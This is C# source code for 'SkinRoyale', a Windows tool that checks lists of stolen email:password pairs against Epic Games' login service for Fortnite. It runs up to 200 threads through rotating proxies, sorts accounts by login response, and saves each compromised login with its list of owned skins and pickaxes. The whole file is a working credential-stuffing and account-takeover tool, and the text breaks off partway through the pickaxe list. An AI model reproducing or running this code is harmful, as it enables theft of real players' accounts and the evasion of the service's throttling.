using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using VisualPlus.Toolkit.Dialogs;
using xNet;

namespace SkinRoyale
{
    public partial class frmMain : VisualForm
    {
        private bool isDone { get; set; }
        private bool _Run { get; set; }
        private bool _IsGood { get; set; }
        public ProxyType PType { get; set; }
        public int Threadscount { get; set; }
        public int ThreadSleepCount { get; set; }

        public frmMain()
        {
            bool flag5 = true;
            if (flag5)
            {
                InitializeComponent();
                folder = Path.Combine(string.Format("{0}\\Results\\", Environment.CurrentDirectory), "Results_" + DateTime.Now.ToString("dd.MM_hh.mm"));
                bool flag6 = !Directory.Exists(folder);
                if (flag6)
                {
                    Directory.CreateDirectory(folder);
                }
                cmbProxyType.SelectedIndex = 0;
                tp1.ToolTipIcon = ToolTipIcon.Info;
                tp1.IsBalloon = true;
                tp1.ShowAlways = true;
                tp1.SetToolTip(lblInvalid, "Invalids refers to accounts that are considered bad or aren't worth anything.");
                tp1.SetToolTip(lblValid, "Valid accounts with atleast 1+ skin.");
                tp1.SetToolTip(lblErrors, "Errors returned by epic games.. doesn't affect your hit-rate.");
                tp1.SetToolTip(lblChecked, "The amount of accounts checked.");
                tp1.SetToolTip(cmbCapture, "This filter is still being worked on.");
                tp1.SetToolTip(cmbProxyType, "Select whether you wish to use proxies or not!");
                tp1.SetToolTip(btnCombo, "Load accounts in a constant algorithm following the format (email:pass) per line, preferably bruted hits from BruteRoyale.");
                tp1.SetToolTip(btnProxy, "Only load proxies in the format of ip:port. Make sure also that you select the type of proxies they are on the bottom left.");
            }
        }

        private void frmMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            Environment.Exit(0);
            //The first thing i said when i saw this was "Ummmm.... K."
            Application.Exit();
        }

        private void btnCombo_Click(object sender, EventArgs e)
        {
            Combo.Clear();
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.RestoreDirectory = true;
            ofd.Multiselect = false;
            ofd.Filter = "Text Files (*.txt)|*.txt";
            ofd.FilterIndex = 1;
            ofd.ShowDialog();
            bool flag8 = Operators.CompareString(ofd.FileName, null, false) > 0;
            if (flag8)
            {
                myFile = ofd.FileName;
                using (StreamReader sr = new StreamReader(myFile))
                {
                    while (sr.Peek() != -1)
                    {
                        Combo.Add(sr.ReadLine());
                    }
                }
                btnCombo.Text = string.Format("Combo List ({0})", Combo.Count);
                btnProxy.Text = string.Format("Proxy List ({0})", Proxies.Count);
                fileName = Path.GetFileNameWithoutExtension(ofd.FileName);
            }
        }

        private void btnProxy_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Title = "Load Proxy List";
            ofd.DefaultExt = "txt";
            ofd.Filter = "Text files|*.txt";
            ofd.RestoreDirectory = true;
            bool flag8 = ofd.ShowDialog() == DialogResult.OK;
            if (flag8)
            {
                try
                {
                    string text = null;
                    FileStream fileStream = new FileStream(ofd.FileName, FileMode.Open, FileAccess.Read);
                    using (StreamReader streamReader = new StreamReader(fileStream, Encoding.UTF8))
                    {
                        text = streamReader.ReadToEnd();
                    }
                    bool flag9 = string.IsNullOrEmpty(text);
                    if (!flag9)
                    {
                        Proxies.Clear();
                        Proxies.AddRange(text.Split(new char[]
                        {
                            Convert.ToChar('\n')
                        }));
                        btnCombo.Text = string.Format("Combo List ({0})", Combo.Count);
                        btnProxy.Text = string.Format("Proxy List ({0})", Proxies.Count);
                    }
                }
                catch (Exception)
                {
                }
            }
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            bool flag = Directory.Exists(string.Format("{0}\\Results", Environment.CurrentDirectory));
            if (!flag)
            {
                Directory.CreateDirectory(string.Format("{0}\\Results", Environment.CurrentDirectory));
            }
            textfile = Path.Combine(folder, string.Format("{0}_Checked_By_SkinRoyale.txt", fileName));
            btnStart.Enabled = false;
            validcnt = 0;
            invalidcnt = 0;
            errorcnt = 0;
            checkedcnt = 0;
            _Run = false;
            index = 0;
            _Run = true;
            SetEnum(cmbProxyType.SelectedIndex);
            mainMethod();
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            DialogResult dialog = MessageBox.Show("Are you sure you want to stop checking?", "Cancel", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
            bool flag = dialog == DialogResult.Yes;
            if (flag)
            {
                _Run = false;
                _IsGood = false;
                btnStop.Enabled = false;
            }
        }

        private bool isCompleted()
        {
            foreach (Thread item in tList)
            {
                bool isAlive = item.IsAlive;
                if (isAlive)
                {
                    return false;
                }
            }
            return true;
        }

        private void SetEnum(int choice)
        {
            bool flag = choice == 0;
            if (flag)
            {
                PType = ProxyType.Http;
            }
            else
            {
                bool flag2 = choice == 1;
                if (flag2)
                {
                    PType = ProxyType.Socks4;
                }
                else
                {
                    bool flag3 = choice == 2;
                    if (flag3)
                    {
                        PType = ProxyType.Socks5;
                    }
                }
            }
        }

        private ProxyClient GetPClient(string proxy)
        {
            switch (PType)
            {
                case ProxyType.Http:
                    return HttpProxyClient.Parse(proxy);

                case ProxyType.Socks4:
                    return Socks4aProxyClient.Parse(proxy);

                case ProxyType.Socks5:
                    return Socks5ProxyClient.Parse(proxy);
            }
            return HttpProxyClient.Parse(proxy);
        }

        private void DoWork()
        {
            string account = string.Empty;
            _IsGood = true;
            while (_Run)
            {
                object obj = tLock;
                lock (obj)
                {
                    bool flag9 = index < Combo.Count;
                    if (!flag9)
                    {
                        break;
                    }
                    account = Combo.ElementAt(index);
                    index++;
                }
                string[] combo = account.Split(new char[]
                {
                    ';',
                    ':',
                    '|'
                });
                bool flag10 = account.Length < 2;
                if (!flag10)
                {
                    while (_IsGood)
                    {
                        bool flag11 = _Run.Equals(false);
                        if (flag11)
                        {
                            return;
                        }
                        using (HttpRequest req = new HttpRequest())
                        {
                            try
                            {
                                req.UserAgent = "Fortnite/++Fortnite+Release-4.5-CL-4166199 Windows/6.2.9200.1.768.64bit";
                                req.KeepAlive = true;
                                req.Cookies = new CookieDictionary(false);
                                req.IgnoreProtocolErrors = true;
                                req.ConnectTimeout = 5000;
                                req.AllowAutoRedirect = false;
                                bool flag12 = Proxies.Count == 0;
                                if (flag12)
                                {
                                    req.Proxy = null;
                                }
                                else
                                {
                                    req.Proxy = GetPClient(Proxies.ElementAt(rnd.Next(Proxies.Count)));
                                    req.Proxy.ConnectTimeout = 5000;
                                }
                                req.AddHeader("Authorization", "basic ZWM2ODRiOGM2ODdmNDc5ZmFkZWEzY2IyYWQ4M2Y1YzY6ZTFmMzFjMjExZjI4NDEzMTg2MjYyZDM3YTEzZmM4NGQ=");
                                string pData = string.Format("grant_type=password&username={0}&password={1}&includePerms=true&token_type=eg1", WebUtility.UrlEncode(combo[0]), combo[1]);
                                HttpResponse res = req.Post("https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/token", pData, "application/x-www-form-urlencoded");
                                string text = res.ToString();
                                bool flag13 = text.Contains("access_token");
                                if (flag13)
                                {
                                    string bearer = Regex.Match(text, "\"access_token\" : \"(.*?)\",").Groups[1].Value;
                                    string accountID = Regex.Match(text, "\"account_id\" : \"(.*?)\"").Groups[1].Value;
                                    req.AddHeader("Authorization", string.Format("bearer {0}", bearer));
                                    HttpResponse res2 = req.Post(string.Format("https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{0}/client/QueryProfile?profileId=athena&rvn=-1", accountID), "{}", "application/json");
                                    string text2 = res2.ToString();
                                    bool flag14 = text2.Contains("AthenaCharacter");
                                    if (flag14)
                                    {
                                        Interlocked.Increment(ref validcnt);
                                        SaveData(account, text2);
                                        break;
                                    }
                                    bool flag15 = !text2.Contains("AthenaCharacter") && text2.Contains("AthenaPickaxe:defaultpickaxe");
                                    if (flag15)
                                    {
                                        Interlocked.Increment(ref invalidcnt);
                                        break;
                                    }
                                    bool flag16 = text2.Contains("Login is banned or does not posses the action");
                                    if (flag16)
                                    {
                                        Interlocked.Increment(ref invalidcnt);
                                        break;
                                    }
                                    bool flag17 = text2.Contains("Process exited before completing");
                                    if (flag17)
                                    {
                                        Interlocked.Increment(ref invalidcnt);
                                        break;
                                    }
                                }
                                else
                                {
                                    bool flag18 = text.Contains("Sorry the account credentials you are using are invalid");
                                    if (flag18)
                                    {
                                        Interlocked.Increment(ref invalidcnt);
                                        break;
                                    }
                                    bool flag19 = text.Contains("Two-Factor authentication required to process");
                                    if (flag19)
                                    {
                                        Interlocked.Increment(ref invalidcnt);
                                        break;
                                    }
                                    bool flag20 = text.Contains("Operation access is limited by throttling policy");
                                    if (flag20)
                                    {
                                        Interlocked.Increment(ref errorcnt);
                                    }
                                    else
                                    {
                                        bool flag21 = text.Contains("Real ID association is required");
                                        if (flag21)
                                        {
                                            Interlocked.Increment(ref invalidcnt);
                                            break;
                                        }
                                        bool flag22 = text.Contains("Please reset your password to proceed with login");
                                        if (flag22)
                                        {
                                            Interlocked.Increment(ref invalidcnt);
                                            break;
                                        }
                                        bool flag23 = text.Contains("Process exited before completing");
                                        if (flag23)
                                        {
                                            Interlocked.Increment(ref invalidcnt);
                                            break;
                                        }
                                        bool flag24 = text.Contains("account has been locked because of too many invalid login attempts");
                                        if (flag24)
                                        {
                                            Interlocked.Increment(ref invalidcnt);
                                            break;
                                        }
                                        Interlocked.Increment(ref errorcnt);
                                    }
                                }
                            }
                            catch (Exception)
                            {
                                Interlocked.Increment(ref errorcnt);
                            }
                        }
                    }
                    Interlocked.Increment(ref checkedcnt);
                    continue;
                }
            }
            Thread.Sleep(ThreadSleepCount);
        }

        private void updatestatus()
        {
            try
            {
                base.Invoke(new MethodInvoker(delegate
                {
                    lblValid.Text = string.Format("{0}", validcnt);
                    lblInvalid.Text = string.Format("{0}", invalidcnt);
                    lblErrors.Text = string.Format("{0}", errorcnt);
                    lblChecked.Text = string.Format("{0}", checkedcnt);
                }));
            }
            catch (Exception)
            {
            }
        }

        public void mainMethod()
        {
            isDone = false;
            bool flag = cmbProxyType.SelectedIndex == 3;
            if (flag)
            {
                Threadscount = 20;
            }
            else
            {
                Threadscount = 200;
            }
            ThreadSleepCount = 100;
            for (int i = 0; i < Threadscount; i++)
            {
                Thread t = new Thread(new ThreadStart(DoWork));
                t.IsBackground = true;
                tList.Add(t);
                t.Start();
            }
            new Thread(() =>
            {
                for (; ; )
                {
                    bool flag2 = isCompleted();
                    if (flag2)
                    {
                        break;
                    }
                    updatestatus();
                    Thread.Sleep(1000);
                }
                isDone = true;
                base.Invoke(new Action(delegate
                {
                    _Run = false;
                    MessageBox.Show("Brute / Checker has finished successfully.");
                    btnStart.Enabled = true;
                    btnStop.Enabled = true;
                    updatestatus();
                }));
            })
            {
                IsBackground = true
            }.Start();
        }

        private void SaveData(string account, string characters)
        {
            try
            {
                base.Invoke(new MethodInvoker(delegate
                {
                    using (StreamWriter sw = File.AppendText(textfile))
                    {
                        sw.WriteLine("-------------------<EpicAccount>------------------------");
                        sw.WriteLine("- Login: " + account);
                        sw.WriteLine("----------------------<Skins>---------------------------");
                        string x = characters;
                        bool flag = x.Contains("AthenaCharacter:cid_036_athena_commando_m_wintercamo");
                        if (flag)
                        {
                            sw.WriteLine("=> Absolute Zero");
                        }
                        bool flag2 = x.Contains("AthenaCharacter:cid_121_athena_commando_m_graffiti");
                        if (flag2)
                        {
                            sw.WriteLine("=> Abstrakt");
                        }
                        bool flag3 = x.Contains("AthenaCharacter:cid_017_athena_commando_m");
                        if (flag3)
                        {
                            sw.WriteLine("=> Aerial Assault Troop");
                        }
                        bool flag4 = x.Contains("AthenaCharacter:cid_059_athena_commando_m_skidude_chn");
                        if (flag4)
                        {
                            sw.WriteLine("=> Alpine Ace (CHN)");
                        }
                        bool flag5 = x.Contains("AthenaCharacter:cid_055_athena_commando_m_skidude_can");
                        if (flag5)
                        {
                            sw.WriteLine("=> Alpine Ace (CAN)");
                        }
                        bool flag6 = x.Contains("AthenaCharacter:cid_058_athena_commando_m_skidude_ger");
                        if (flag6)
                        {
                            sw.WriteLine("=> Alpine Ace (GER)");
                        }
                        bool flag7 = x.Contains("AthenaCharacter:cid_037_athena_commando_f_wintercamo");
                        if (flag7)
                        {
                            sw.WriteLine("=> Arctic Assassin");
                        }
                        bool flag8 = x.Contains("AthenaCharacter:cid_015_athena_commando_f");
                        if (flag8)
                        {
                            sw.WriteLine("=> Assault Trooper");
                        }
                        bool flag9 = x.Contains("AthenaCharacter:cid_100_athena_commando_m_cuchulainn");
                        if (flag9)
                        {
                            sw.WriteLine("=> Battle Hound");
                        }
                        bool flag10 = x.Contains("AthenaCharacter:cid_125_athena_commando_m_tacticalwoodland");
                        if (flag10)
                        {
                            sw.WriteLine("=> BattleHawk");
                        }
                        bool flag11 = x.Contains("AthenaCharacter:cid_035_athena_commando_m_medieval");
                        if (flag11)
                        {
                            sw.WriteLine("=> Black Knight");
                        }
                        bool flag12 = x.Contains("AthenaCharacter:cid_032_athena_commando_m_medieval");
                        if (flag12)
                        {
                            sw.WriteLine("=> Blue Squire");
                        }
                        bool flag13 = x.Contains("AthenaCharacter:cid_138_athena_commando_m_psburnout");
                        if (flag13)
                        {
                            sw.WriteLine("=> Blue Striker");
                        }
                        bool flag14 = x.Contains("AthenaCharacter:cid_052_athena_commando_f_psblue");
                        if (flag14)
                        {
                            sw.WriteLine("=> Blue Team Leader");
                        }
                        bool flag15 = x.Contains("AthenaCharacter:cid_021_athena_commando_f");
                        if (flag15)
                        {
                            sw.WriteLine("=> Brawler");
                        }
                        bool flag16 = x.Contains("AthenaCharacter:cid_092_athena_commando_f_redshirt");
                        if (flag16)
                        {
                            sw.WriteLine("=> Brilliant Striker");
                        }
                        bool flag17 = x.Contains("AthenaCharacter:cid_044_athena_commando_f_scipop");
                        if (flag17)
                        {
                            sw.WriteLine("=> Brite Bomber ");
                        }
                        bool flag18 = x.Contains("AthenaCharacter:cid_112_athena_commando_m_brite");
                        if (flag18)
                        {
                            sw.WriteLine("=> Brite Gunner");
                        }
                        bool flag19 = x.Contains("AthenaCharacter:cid_104_athena_commando_f_bunny");
                        if (flag19)
                        {
                            sw.WriteLine("=> Bunny Brawler");
                        }
                        bool flag20 = x.Contains("AthenaCharacter:cid_094_athena_commando_m_rider");
                        if (flag20)
                        {
                            sw.WriteLine("=> Burnout");
                        }
                        bool flag21 = x.Contains("AthenaCharacter:cid_115_athena_commando_m_carbideblue");
                        if (flag21)
                        {
                            sw.WriteLine("=> Carbide");
                        }
                        bool flag22 = x.Contains("AthenaCharacter:cid_123_athena_commando_f_metal");
                        if (flag22)
                        {
                            sw.WriteLine("=> Chromium");
                        }
                        bool flag23 = x.Contains("AthenaCharacter:cid_110_athena_commando_f_circuitbreaker");
                        if (flag23)
                        {
                            sw.WriteLine("=> Circuit Breaker");
                        }
                        bool flag24 = x.Contains("AthenaCharacter:cid_151_athena_commando_f_soccergirld");
                        if (flag24)
                        {
                            sw.WriteLine("=> Clinical Crosser");
                        }
                        bool flag25 = x.Contains("AthenaCharacter:cid_051_athena_commando_m_holidayelf");
                        if (flag25)
                        {
                            sw.WriteLine("=> Codename ELF");
                        }
                        bool flag26 = x.Contains("AthenaCharacter:cid_016_athena_commando_f");
                        if (flag26)
                        {
                            sw.WriteLine("=> Commando");
                        }
                        bool flag27 = x.Contains("AthenaCharacter:cid_050_athena_commando_m_holidaynutcracker");
                        if (flag27)
                        {
                            sw.WriteLine("=> Crackshot");
                        }
                        bool flag28 = x.Contains("AthenaCharacter:cid_069_athena_commando_f_pinkbear");
                        if (flag28)
                        {
                            sw.WriteLine("=> Cuddle Team Leader");
                        }
                        bool flag29 = x.Contains("AthenaCharacter:cid_105_athena_commando_f_spaceblack");
                        if (flag29)
                        {
                            sw.WriteLine("=> Dark Vanguard");
                        }
                        bool flag30 = x.Contains("AthenaCharacter:cid_088_athena_commando_m_spaceblack");
                        if (flag30)
                        {
                            sw.WriteLine("=> Dark Voyager");
                        }
                        bool flag31 = x.Contains("AthenaCharacter:cid_076_athena_commando_f_sup");
                        if (flag31)
                        {
                            sw.WriteLine("=> Dazzle");
                        }
                        bool flag32 = x.Contains("AthenaCharacter:cid_040_athena_commando_m_district");
                        if (flag32)
                        {
                            sw.WriteLine("=> Devastator");
                        }
                        bool flag33 = x.Contains("AthenaCharacter:cid_083_athena_commando_f_tactical");
                        if (flag33)
                        {
                            sw.WriteLine("=> Elite Agent");
                        }
                        bool flag34 = x.Contains("AthenaCharacter:cid_143_athena_commando_f_darkninja");
                        if (flag34)
                        {
                            sw.WriteLine("=> Fate");
                        }
                        bool flag35 = x.Contains("AthenaCharacter:cid_132_athena_commando_m_venus");
                        if (flag35)
                        {
                            sw.WriteLine("=> Flytrap");
                        }
                        bool flag36 = x.Contains("AthenaCharacter:cid_038_athena_commando_m_disco");
                        if (flag36)
                        {
                            sw.WriteLine("=> Funk Ops");
                        }
                        bool flag37 = x.Contains("AthenaCharacter:cid_029_athena_commando_f_halloween");
                        if (flag37)
                        {
                            sw.WriteLine("=> Ghoul Trooper");
                        }
                        bool flag38 = x.Contains("AthenaCharacter:cid_048_athena_commando_f_holidaygingerbread");
                        if (flag38)
                        {
                            sw.WriteLine("=> Ginger Gunner");
                        }
                        bool flag39 = x.Contains("AthenaCharacter:cid_155_athena_commando_f_gumshoe");
                        if (flag39)
                        {
                            sw.WriteLine("=> Gumshoe ");
                        }
                        bool flag40 = x.Contains("AthenaCharacter:cid_089_athena_commando_m_retrogrey");
                        if (flag40)
                        {
                            sw.WriteLine("=> Havoc");
                        }
                        bool flag41 = x.Contains("AthenaCharacter:cid_099_athena_commando_f_scathach");
                        if (flag41)
                        {
                            sw.WriteLine("=> Highland Warrior");
                        }
                        bool flag42 = x.Contains("AthenaCharacter:cid_074_athena_commando_f_stripe");
                        if (flag42)
                        {
                            sw.WriteLine("=> Jungle Scout");
                        }
                        bool flag43 = x.Contains("AthenaCharacter:cid_108_athena_commando_m_fishhead");
                        if (flag43)
                        {
                            sw.WriteLine("=> Leviathan");
                        }
                        bool flag44 = x.Contains("AthenaCharacter:cid_126_athena_commando_m_auroraglow");
                        if (flag44)
                        {
                            sw.WriteLine("=> LiteShow");
                        }
                        bool flag45 = x.Contains("AthenaCharacter:cid_070_athena_commando_m_cupid");
                        if (flag45)
                        {
                            sw.WriteLine("=> Love Ranger");
                        }
                        bool flag46 = x.Contains("AthenaCharacter:cid_103_athena_commando_m_bunny");
                        if (flag46)
                        {
                            sw.WriteLine("=> Bunny Raider");
                        }
                        bool flag47 = x.Contains("AthenaCharacter:cid_049_athena_commando_m_holidaygingerbread");
                        if (flag47)
                        {
                            sw.WriteLine("=> Marry Marauder");
                        }
                        bool flag48 = x.Contains("AthenaCharacter:cid_080_athena_commando_m_space");
                        if (flag48)
                        {
                            sw.WriteLine("=> Mission Specialist");
                        }
                        bool flag49 = x.Contains("AthenaCharacter:cid_081_athena_commando_f_space");
                        if (flag49)
                        {
                            sw.WriteLine("=> Moonwalker");
                        }
                        bool flag50 = x.Contains("AthenaCharacter:cid_062_athena_commando_f_skigirl_usa");
                        if (flag50)
                        {
                            sw.WriteLine("=> Mogul Master (USA)");
                        }
                        bool flag51 = x.Contains("AthenaCharacter:cid_023_athena_commando_f");
                        if (flag51)
                        {
                            sw.WriteLine("=> Munitions Expert");
                        }
                        bool flag52 = x.Contains("AthenaCharacter:cid_124_athena_commando_f_auroraglow");
                        if (flag52)
                        {
                            sw.WriteLine("=> NiteLite");
                        }
                        bool flag53 = x.Contains("AthenaCharacter:cid_046_athena_commando_f_holidaysweater");
                        if (flag53)
                        {
                            sw.WriteLine("=> Nog Ops");
                        }
                        bool flag54 = x.Contains("AthenaCharacter:cid_159_athena_commando_m_gumshoedark");
                        if (flag54)
                        {
                            sw.WriteLine("=> Noir");
                        }
                        bool flag55 = x.Contains("AthenaCharacter:cid_116_athena_commando_m_carbideblack");
                        if (flag55)
                        {
                            sw.WriteLine("=> Omega");
                        }
                        bool flag56 = x.Contains("AthenaCharacter:cid_141_athena_commando_m_darkeagle");
                        if (flag56)
                        {
                            sw.WriteLine("=> Omen");
                        }
                        bool flag57 = x.Contains("AthenaCharacter:cid_149_athena_commando_f_soccergirlb");
                        if (flag57)
                        {
                            sw.WriteLine("=> Poised Playmaker");
                        }
                        bool flag58 = x.Contains("AthenaCharacter:cid_097_athena_commando_f_rockerpunk");
                        if (flag58)
                        {
                            sw.WriteLine("=> Power Chord");
                        }
                        bool flag59 = x.Contains("AthenaCharacter:cid_091_athena_commando_m_redshirt");
                        if (flag59)
                        {
                            sw.WriteLine("=> Radiant Striker");
                        }
                        bool flag60 = x.Contains("AthenaCharacter:cid_135_athena_commando_f_jailbird");
                        if (flag60)
                        {
                            sw.WriteLine("=> Rapscallion");
                        }
                        bool flag61 = x.Contains("AthenaCharacter:cid_031_athena_commando_m_retro");
                        if (flag61)
                        {
                            sw.WriteLine("=> Raptor");
                        }
                        bool flag62 = x.Contains("AthenaCharacter:cid_102_athena_commando_m_raven");
                        if (flag62)
                        {
                            sw.WriteLine("=> Raven");
                        }
                        bool flag63 = x.Contains("cid_022_athena_commando_f");
                        if (flag63)
                        {
                            sw.WriteLine("=> Recon Expert");
                        }
                        bool flag64 = x.Contains("AthenaCharacter:cid_024_athena_commando_f");
                        if (flag64)
                        {
                            sw.WriteLine("=> Recon Specialist");
                        }
                        bool flag65 = x.Contains("AthenaCharacter:cid_034_athena_commando_f_medieval");
                        if (flag65)
                        {
                            sw.WriteLine("=> Red Knight");
                        }
                        bool flag66 = x.Contains("AthenaCharacter:cid_047_athena_commando_f_holidayreindeer");
                        if (flag66)
                        {
                            sw.WriteLine("=> Red Nosed Raider");
                        }
                        bool flag67 = x.Contains("AthenaCharacter:cid_013_athena_commando_f");
                        if (flag67)
                        {
                            sw.WriteLine("=> Renegade");
                        }
                        bool flag68 = x.Contains("AthenaCharacter:cid_028_athena_commando_f");
                        if (flag68)
                        {
                            sw.WriteLine("=> Renegade Raider");
                        }
                        bool flag69 = x.Contains("AthenaCharacter:cid_093_athena_commando_m_dinosaur");
                        if (flag69)
                        {
                            sw.WriteLine("=> Rex");
                        }
                        bool flag70 = x.Contains("AthenaCharacter:cid_090_athena_commando_m_tactical");
                        if (flag70)
                        {
                            sw.WriteLine("=> Rogue Agent");
                        }
                        bool flag71 = x.Contains("AthenaCharacter:cid_033_athena_commando_f_medieval");
                        if (flag71)
                        {
                            sw.WriteLine("=> Royale Knight");
                        }
                        bool flag72 = x.Contains("AthenaCharacter:cid_082_athena_commando_m_scavenger");
                        if (flag72)
                        {
                            sw.WriteLine("=> Rust Lord");
                        }
                        bool flag73 = x.Contains("AthenaCharacter:cid_087_athena_commando_f_redsilk");
                        if (flag73)
                        {
                            sw.WriteLine("=> Scarlet Defender");
                        }
                        bool flag74 = x.Contains("AthenaCharacter:cid_134_athena_commando_m_jailbird");
                        if (flag74)
                        {
                            sw.WriteLine("=> Scoundrel");
                        }
                        bool flag75 = x.Contains("AthenaCharacter:cid_072_athena_commando_m_scout");
                        if (flag75)
                        {
                            sw.WriteLine("=> Scout");
                        }
                        bool flag76 = x.Contains("AthenaCharacter:cid_098_athena_commando_f_stpatty");
                        if (flag76)
                        {
                            sw.WriteLine("=> Sgt Green Clover");
                        }
                        bool flag77 = x.Contains("AthenaCharacter:cid_043_athena_commando_f_stealth");
                        if (flag77)
                        {
                            sw.WriteLine("=> Shadow Ops");
                        }
                        bool flag78 = x.Contains("AthenaCharacter:cid_030_athena_commando_m_halloween");
                        if (flag78)
                        {
                            sw.WriteLine("=> Skull Trooper");
                        }
                        bool flag79 = x.Contains("AthenaCharacter:cid_142_athena_commando_m_wwiipilot");
                        if (flag79)
                        {
                            sw.WriteLine("=> Sky Stalker");
                        }
                        bool flag80 = x.Contains("AthenaCharacter:cid_073_athena_commando_f_scuba");
                        if (flag80)
                        {
                            sw.WriteLine("=> Snorkel Ops");
                        }
                        bool flag81 = x.Contains("AthenaCharacter:cid_150_athena_commando_f_soccergirlc");
                        if (flag81)
                        {
                            sw.WriteLine("=> Soccer Girl C");
                        }
                        bool flag82 = x.Contains("AthenaCharacter:cid_039_athena_commando_f_disco");
                        if (flag82)
                        {
                            sw.WriteLine("=> Sparkle Specialist");
                        }
                        bool flag83 = x.Contains("AthenaCharacter:cid_020_athena_commando_m");
                        if (flag83)
                        {
                            sw.WriteLine("=> Special Forces");
                        }
                        bool flag84 = x.Contains("AthenaCharacter:cid_117_athena_commando_m_tacticaljungle");
                        if (flag84)
                        {
                            sw.WriteLine("=> Squad Leader");
                        }
                        bool flag85 = x.Contains("AthenaCharacter:cid_085_athena_commando_m_twitch");
                        if (flag85)
                        {
                            sw.WriteLine("=> Sub Commander");
                        }
                        bool flag86 = x.Contains("AthenaCharacter:cid_027_athena_commando_f");
                        if (flag86)
                        {
                            sw.WriteLine("=> Survival Specialist");
                        }
                        bool flag87 = x.Contains("AthenaCharacter:cid_120_athena_commando_f_graffiti");
                        if (flag87)
                        {
                            sw.WriteLine("=> Teknique");
                        }
                        bool flag88 = x.Contains("AthenaCharacter:cid_084_athena_commando_m_assassin");
                        if (flag88)
                        {
                            sw.WriteLine("=> The Reaper");
                        }
                        bool flag89 = x.Contains("AthenaCharacter:cid_140_athena_commando_m_visitor");
                        if (flag89)
                        {
                            sw.WriteLine("=> The Visitor");
                        }
                        bool flag90 = x.Contains("AthenaCharacter:cid_109_athena_commando_m_pizza");
                        if (flag90)
                        {
                            sw.WriteLine("=> Tomato Headd");
                        }
                        bool flag91 = x.Contains("AthenaCharacter:cid_127_athena_commando_m_hazmat");
                        if (flag91)
                        {
                            sw.WriteLine("=> Toxic Trooper");
                        }
                        bool flag92 = x.Contains("AthenaCharacter:cid_114_athena_commando_f_tacticalwoodland");
                        if (flag92)
                        {
                            sw.WriteLine("=> Trailblazer");
                        }
                        bool flag93 = x.Contains("cid_009_athena_commando_m");
                        if (flag93)
                        {
                            sw.WriteLine("=> Tracker");
                        }
                        bool flag94 = x.Contains("AthenaCharacter:cid_107_athena_commando_f_pajamaparty");
                        if (flag94)
                        {
                            sw.WriteLine("=> Tricera Ops");
                        }
                        bool flag95 = x.Contains("AthenaCharacter:cid_137_athena_commando_f_basketball");
                        if (flag95)
                        {
                            sw.WriteLine("=> Triple Threat");
                        }
                        bool flag96 = x.Contains("AthenaCharacter:cid_012_athena_commando_m");
                        if (flag96)
                        {
                            sw.WriteLine("=> Trooper");
                        }
                        bool flag97 = x.Contains("AthenaCharacter:cid_118_athena_commando_f_valor");
                        if (flag97)
                        {
                            sw.WriteLine("=> Valor");
                        }
                        bool flag98 = x.Contains("AthenaCharacter:cid_133_athena_commando_f_deco");
                        if (flag98)
                        {
                            sw.WriteLine("=> Ventura");
                        }
                        bool flag99 = x.Contains("AthenaCharacter:cid_129_athena_commando_m_deco");
                        if (flag99)
                        {
                            sw.WriteLine("=> Venturion");
                        }
                        bool flag100 = x.Contains("cid_160_athena_commando_m_speedyred");
                        if (flag100)
                        {
                            sw.WriteLine("=> Vertex");
                        }
                        bool flag101 = x.Contains("AthenaCharacter:cid_106_athena_commando_f_taxi");
                        if (flag101)
                        {
                            sw.WriteLine("=> Whiplash");
                        }
                        bool flag102 = x.Contains("AthenaCharacter:cid_139_athena_commando_m_fighterpilot");
                        if (flag102)
                        {
                            sw.WriteLine("=> Wingman");
                        }
                        bool flag103 = x.Contains("AthenaCharacter:cid_071_athena_commando_m_wukong");
                        if (flag103)
                        {
                            sw.WriteLine("=> Wukong");
                        }
                        bool flag104 = x.Contains("AthenaCharacter:cid_045_athena_commando_m_holidaysweater");
                        if (flag104)
                        {
                            sw.WriteLine("=> Yuletide Ranger");
                        }
                        bool flag105 = x.Contains("AthenaCharacter:cid_119_athena_commando_f_candy");
                        if (flag105)
                        {
                            sw.WriteLine("=> Zoey");
                        }
                        sw.WriteLine("--------------------------------------------------------");
                        sw.WriteLine("----------------------<Pickaxes>------------------------");
                        bool flag106 = x.Contains("AthenaPickaxe:pickaxe_id_013_teslacoil");
                        if (flag106)
                        {
                            sw.WriteLine("=> AC/DC");
                        }
                        bool flag107 = x.Contains("AthenaPickaxe:pickaxe_id_053_deco");
                        if (flag107)
                        {
                            sw.WriteLine("=> Airfoil");
                        }
                        bool flag108 = x.Contains("AthenaPickaxe:pickaxe_id_011_medieval");
                        if (flag108)
                        {
                            sw.WriteLine("=> Axecalibur");
                        }
                        bool flag109 = x.Contains("AthenaPickaxe:pickaxe_id_040_pizza");
                        if (flag109)
                        {
                            sw.WriteLine("=> Axeroni");
                        }
                        bool flag110 = x.Contains("AthenaPickaxe:sicklebatpickaxe");
                        if (flag110)
                        {
                            sw.WriteLine("=> Batsickle");
                        }
                        bool flag111 = x.Contains("AthenaPickaxe:pickaxe_id_041_pajamaparty");
                        if (flag111)
                        {
                            sw.WriteLine("=> Bitemark");
                        }
                        bool flag112 = x.Contains("AthenaPickaxe:pickaxe_id_018_anchor");
                        if (flag112)
                        {
                            sw.WriteLine("=> Bottom Feeder");
                        }
                        bool flag113 = x.Contains("AthenaPickaxe:pickaxe_id_015_holidaycandycane");
                        if (flag113)
                        {
                            sw.WriteLine("=> Candy Axe");
                        }
                        bool flag114 = x.Contains("AthenaPickaxe:pickaxe_id_038_carrot");
                        if (flag114)
                        {
                            sw.WriteLine("=> Carrot Stick");
                        }
                        bool flag115 = x.Contains("AthenaPickaxe:pickaxe_id_017_shark");
                        if (flag115)
                        {
                            sw.WriteLine("=> Chomp Jr.");
                        }
                        bool flag116 = x.Contains("AthenaPickaxe:skiicepickaxe");
                        if (flag116)
                        {
                            sw.WriteLine("=> Cliffhanger");
                        }
                        bool flag117 = x.Contains("AthenaPickaxe:defaultpickaxe");
                        if (flag117)
                        {
